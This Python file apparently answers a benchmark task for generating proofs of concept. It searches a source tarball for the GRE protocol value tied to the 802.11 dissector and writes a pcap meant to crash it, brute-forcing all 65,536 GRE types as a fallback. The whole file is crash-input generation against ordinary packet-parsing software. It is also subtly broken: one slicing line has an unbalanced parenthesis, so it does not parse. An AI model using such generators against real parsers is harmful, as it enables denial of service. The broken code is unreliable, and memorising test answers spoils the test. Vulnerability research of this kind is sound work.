import struct
import tarfile
import re
from typing import Optional, Dict, List


def ipv4_checksum(hdr: bytes) -> int:
    s = 0
    for i in range(0, len(hdr), 2):
        if i + 1 < len(hdr):
            w = (hdr[i] << 8) + hdr[i + 1]
        else:
            w = (hdr[i] << 8)
        s += w
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def build_eth_ip_gre_packet(gre_proto: int) -> bytes:
    # Ethernet header: dst(6) src(6) type(2)
    eth = struct.pack("!6s6sH", b"\x00" * 6, b"\x00" * 6, 0x0800)  # IPv4

    # IPv4 header
    version_ihl = 0x45
    tos = 0
    ip_payload_len = 4  # GRE header only
    total_length = 20 + ip_payload_len
    identification = 0
    flags_fragment = 0
    ttl = 64
    protocol = 47  # GRE
    checksum = 0
    src_ip = 0
    dst_ip = 0

    ip_hdr_wo_csum = struct.pack(
        "!BBHHHBBHII",
        version_ihl,
        tos,
        total_length,
        identification,
        flags_fragment,
        ttl,
        protocol,
        checksum,
        src_ip,
        dst_ip,
    )

    csum = ipv4_checksum(ip_hdr_wo_csum)
    ip_hdr = struct.pack(
        "!BBHHHBBHII",
        version_ihl,
        tos,
        total_length,
        identification,
        flags_fragment,
        ttl,
        protocol,
        csum,
        src_ip,
        dst_ip,
    )

    # GRE header minimal: Flags/Version(2) + Protocol Type(2)
    gre_hdr = struct.pack("!HH", 0x0000, gre_proto & 0xFFFF)

    return eth + ip_hdr + gre_hdr


def build_pcap_with_packets(packets: List[bytes], linktype: int = 1) -> bytes:
    # PCAP Global Header, little endian
    ghdr = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 0x0000FFFF, linktype)
    parts = [ghdr]
    for pkt in packets:
        incl_len = len(pkt)
        orig_len = len(pkt)
        phdr = struct.pack("<IIII", 0, 0, incl_len, orig_len)
        parts.append(phdr)
        parts.append(pkt)
    return b"".join(parts)


def parse_define_map(tf: tarfile.TarFile) -> Dict[str, str]:
    define_map: Dict[str, str] = {}
    define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/\*.*?\*/|//.*)?$", re.MULTILINE)
    for m in tf.getmembers():
        if not m.isfile():
            continue
        name_lower = m.name.lower()
        if not (name_lower.endswith(".h") or name_lower.endswith(".c") or name_lower.endswith(".hpp")):
            continue
        try:
            f = tf.extractfile(m)
            if not f:
                continue
            data = f.read()
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                continue
            for dm in define_re.finditer(text):
                key = dm.group(1)
                val = dm.group(2).strip()
                # Skip function-like macros
                if "(" in key:
                    continue
                # Clean trailing comments and parentheses around value
                val = val.strip()
                define_map[key] = val
        except Exception:
            continue
    return define_map


def safe_parse_int(expr: str) -> Optional[int]:
    expr = expr.strip()
    # Remove common integer suffixes
    expr = re.sub(r"[uUlL]+$", "", expr)
    try:
        return int(expr, 0)
    except Exception:
        return None


def eval_expr(expr: str, defines: Dict[str, str], depth: int = 0) -> Optional[int]:
    if depth > 10:
        return None
    expr = expr.strip()
    v = safe_parse_int(expr)
    if v is not None:
        return v

    # Replace known identifiers with their values recursively
    token_re = re.compile(r"\b([A-Za-z_]\w*)\b")
    changed = True
    last_expr = expr
    loops = 0
    while changed and loops < 50:
        loops += 1
        changed = False
        def repl(m):
            nonlocal changed
            name = m.group(1)
            if name in defines:
                val = defines[name]
                iv = eval_expr(val, defines, depth + 1)
                if iv is not None:
                    changed = True
                    return str(iv)
            return name
        expr = token_re.sub(repl, expr)
        if expr != last_expr:
            last_expr = expr

    # After substitution, ensure only safe characters remain
    if re.fullmatch(r"[\s0-9xXa-fA-F\+\-\|\&\^\(\)<>~]+", expr) is None:
        return None

    try:
        val = eval(expr, {"__builtins__": None}, {})
        if isinstance(val, int):
            return val & 0xFFFFFFFF
    except Exception:
        return None
    return None


def find_gre_proto_for_80211(tf: tarfile.TarFile) -> Optional[int]:
    define_map = parse_define_map(tf)
    gre_add_re = re.compile(
        r'dissector_add_uint\(\s*"gre\.proto"\s*,\s*([^\s,)\n]+)\s*,\s*([^\s,)\n]+)\s*\)',
        re.MULTILINE,
    )
    candidates: List[tuple] = []

    for m in tf.getmembers():
        if not m.isfile():
            continue
        name_lower = m.name.lower()
        if not (name_lower.endswith(".c") or name_lower.endswith(".h")):
            continue
        try:
            f = tf.extractfile(m)
            if not f:
                continue
            data = f.read()
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                continue
            for gm in gre_add_re.finditer(text):
                proto_tok = gm.group(1).strip()
                handle_tok = gm.group(2).strip()
                context = text[max(0, gm.start() - 200): gm.end() + 200)].lower()
                filename = m.name.lower()
                score = 0
                # Heuristics to identify 802.11
                if "802.11" in context or "80211" in context or "ieee80211" in context:
                    score += 5
                if "wlan" in context:
                    score += 2
                if "802.11" in filename or "80211" in filename or "wlan" in filename:
                    score += 3
                if "ieee80211" in handle_tok.lower() or "wlan" in handle_tok.lower() or "80211" in handle_tok.lower():
                    score += 5
                candidates.append((score, proto_tok))
        except Exception:
            continue

    if not candidates:
        return None

    # Pick the highest-score candidate
    candidates.sort(key=lambda x: x[0], reverse=True)
    for _, proto_tok in candidates:
        val = eval_expr(proto_tok, define_map)
        if val is not None:
            return val & 0xFFFF

    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        proto_val: Optional[int] = None
        try:
            with tarfile.open(src_path, "r:*") as tf:
                proto_val = find_gre_proto_for_80211(tf)
        except Exception:
            proto_val = None

        if proto_val is not None:
            pkt = build_eth_ip_gre_packet(proto_val)
            return build_pcap_with_packets([pkt], linktype=1)

        # Fallback: brute-force a wide range of GRE Protocol Types.
        # Order with likely candidates first.
        likely = [
            0x0000, 0x0001, 0x0002, 0x0019, 0x0800, 0x0806, 0x8035, 0x8100, 0x86DD, 0x8847, 0x8848,
            0x6558, 0x88BE, 0x88BB, 0x88CC, 0x88E5, 0x88F7, 0x88F8, 0x9000, 0xFFFF
        ]
        seen = set()
        protos: List[int] = []
        for v in likely:
            if 0 <= v <= 0xFFFF and v not in seen:
                protos.append(v)
                seen.add(v)

        # Add remaining values but keep file reasonable size; aim for early crash
        # We'll include all 0..65535 to guarantee coverage, but order the rest ascending skipping those already added.
        for v in range(0, 0x10000):
            if v not in seen:
                protos.append(v)

        packets = []
        for p in protos:
            packets.append(build_eth_ip_gre_packet(p))
        return build_pcap_with_packets(packets, linktype=1)
